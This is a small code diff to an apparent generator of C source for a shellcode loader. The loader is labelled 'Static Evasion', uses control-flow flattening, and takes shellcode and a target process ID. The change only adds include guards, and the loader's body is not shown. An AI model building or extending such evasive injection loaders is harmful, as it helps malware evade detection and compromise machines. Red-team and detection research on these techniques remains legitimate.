@@ -31,6 +31,9 @@ def generate_control_flow_flattening() -> Dict[str, Any]:
 // Layer 1 – Static Evasion
 // State machine dispatcher replaces structured control flow.
 
+#ifndef PHANTOM_CONTROL_FLOW_FLATTEN_INCLUDED
+#define PHANTOM_CONTROL_FLOW_FLATTEN_INCLUDED
+
 static void run_flattened_loader(
         unsigned char *shellcode, size_t shellcode_len,
         DWORD target_pid) {{
@@ -78,6 +81,8 @@ static void run_flattened_loader(
         }}
     }}
 }}
+
+#endif /* PHANTOM_CONTROL_FLOW_FLATTEN_INCLUDED */
 """
 
     return {
